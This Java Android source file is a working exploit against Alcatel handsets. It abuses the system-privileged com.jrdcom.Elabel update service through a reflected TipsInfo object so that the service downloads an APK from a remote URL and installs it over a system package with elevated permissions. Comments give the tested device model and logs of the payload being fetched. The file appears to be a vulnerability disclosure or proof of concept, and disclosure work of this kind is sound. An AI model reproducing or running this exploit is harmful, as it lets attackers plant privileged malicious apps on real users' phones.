/* This code makes use of com.jrdcom.Elabel android.uid.system service on Alcatel
 * handsets. The service allows the vendor to update and install APK's including 
 * those with privileged permissions by making a serialized object request. The
 * service will download and install an APK from android.uid.system privileged 
 * process permitting to overwrite existing applications or installing APK with
 * elevated permissions.
 *
 ( Tested against Alcatel A574BL running Android 7.1.1.
 * */
package hf.alcatelpwn;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import org.apache.commons.lang3.SerializationUtils;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectInputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Method;
import dalvik.system.DexFile;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        final Button button = findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                try {
/*
10-29 12:11:33.556  4764  4955 W asset   : Asset path /storage/emulated/0/Android/data/com.jrdcom.Elabel/files/updateSdk/app_self/agent1.apk is neither a directory nor file (type=1).
10-29 12:11:33.557  4764  4955 I CheckUpdateSDKLog: 2.1.14:com.jrdcom.Elabel->DownloadTask->!isExistNewestApk()下载:com.tcl.update.TipsInfo@ba65af8  url:http://TARGETURI/agent1.apk  name:agent1.apk
10-29 12:11:33.558  4764  4955 I CheckUpdateSDKLog: 2.1.14:com.jrdcom.Elabel->No connect!!!  url:http://TARGETURI/agent1.apk  name:agent1.apk
10-29 12:11:33.558  4764  4955 I CheckUpdateSDKLog: TipsDownloadTask->onEnd()->task-loader

1.1.1.1 - - [29/Oct/2019:04:00:07 +0100] "GET /agent.apk HTTP/1.1" 206 54720 "-" "Dalvik/2.1.0 (Linux; U; Android 7.1.1; A574BL Build/NMF26F)"
1.1.1.1 - - [29/Oct/2019:04:00:08 +0100] "GET /agent.apk HTTP/1.1" 206 557751 "-" "Dalvik/2.1.0 (Linux; U; Android 7.1.1; A574BL Build/NMF26F)"
*/
                    PackageManager packageManager = getPackageManager();
                    ApplicationInfo appInfo = packageManager.getApplicationInfo("com.jrdcom.Elabel", 0);
                    DexFile df = new DexFile(appInfo.sourceDir);
                    ClassLoader cl = getClassLoader();
                    Class TipsInfo = df.loadClass("com.tcl.update.TipsInfo", cl);
                    Serializable plugin = (Serializable)TipsInfo.newInstance();
                    Class[] stringTypes = new Class[1];
                    stringTypes[0] = String.class;
                    Method setUrl = TipsInfo.getMethod("setUrl", stringTypes);
                    Method setName = TipsInfo.getMethod("setName", stringTypes);
                    Method setPkgName = TipsInfo.getMethod("setPkgName", stringTypes);
                    Method setMode = TipsInfo.getMethod("setMode", int.class); // if not set to 2, won't install
                    Method getStatusText = TipsInfo.getMethod("getStatusText");

                    /* must overwrite a system APK e.g. Gallery.apk */
                    setUrl.invoke(plugin,"http://targeturi/agent.apk"); // download from this url
                    setPkgName.invoke(plugin,"com.package.name"); // overwrite an android.uid.system package
                    setName.invoke(plugin,"packagename"); // the package name
                    setMode.invoke(plugin,2);
                    /*ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    ObjectOutput out = null;
                    try {
                        out = new ObjectOutputStream(bos);
                        out.writeObject(plugin);
                        out.flush();
                        byte[] yourBytes = bos.toByteArray();
                    } finally {
                        try {
                            bos.close();
                        } catch (IOException ex) {
                            // ignore close exception
                        }
                    }
                    Log.w("Serialized object:",bos.toString());*/
                    Intent intent = new Intent();
                    intent.setClassName("com.jrdcom.Elabel","com.tcl.update.UpdateSdkService");
                    intent.setAction("com.tcl.update.UpdateSdkManager.action_everyday_tips_task");
                    intent.putExtra("tipsinfo",plugin);
                    startService(intent);
                    Object Status = getStatusText.invoke(plugin);
                    Log.w("Status:", Status.toString());
                } catch (Exception e) {
                    AlertDialog alertDialog = new AlertDialog.Builder(MainActivity.this).create();
                    alertDialog.setTitle("Error!");
                    alertDialog.setMessage("The exploit has failed.");
                    alertDialog.setButton(AlertDialog.BUTTON_NEUTRAL, "OK",
                            new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int which) {
                                    dialog.dismiss();
                                }
                            });
                    alertDialog.show();
                    e.printStackTrace();
                }
            }
        });
    }

    public static Context getPackageContext(Context context, String packageName) {
        try {
            return context.getApplicationContext().createPackageContext(packageName, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
        } catch (PackageManager.NameNotFoundException e) {
            return null;
        }
    }

    private byte[] convertToBytes(Object object) throws IOException {
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             ObjectOutput out = new ObjectOutputStream(bos)) {
            out.writeObject(object);
            return bos.toByteArray();
        }
    }
}
